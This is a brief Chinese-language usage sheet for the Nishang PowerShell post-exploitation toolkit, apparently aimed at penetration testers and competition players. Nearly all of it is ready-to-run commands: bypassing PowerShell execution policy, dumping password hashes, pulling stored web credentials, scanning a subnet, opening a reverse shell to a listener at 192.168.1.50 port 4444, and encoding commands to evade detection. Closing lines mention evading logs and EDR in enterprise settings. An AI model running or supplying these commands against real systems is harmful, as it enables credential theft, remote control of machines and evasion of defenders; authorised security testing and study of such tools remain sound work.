# Nishang 使用

Nishang 是一组 PowerShell 安全测试脚本，覆盖枚举、凭据、网络和后渗透验证。使用时建议只加载需要的函数，避免整包执行造成噪声。

## 加载脚本

```bash
powershell -ExecutionPolicy Bypass -File .\\Get-Information.ps1
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\Get-PassHashes.ps1; Get-PassHashes"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\Invoke-PortScan.ps1; Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254"
```

## 网络和枚举

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\Get-WebCredentials.ps1; Get-WebCredentials"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.50 -Port 4444"
```

```bash
powershell -ExecutionPolicy Bypass -Command ". .\\Invoke-Encode.ps1; Invoke-Encode -DataToEncode 'whoami' -IsString"
```

Nishang 脚本差异很大，执行前先读参数。比赛环境里常用来快速验证思路，企业环境里要注意日志和 EDR 响应。
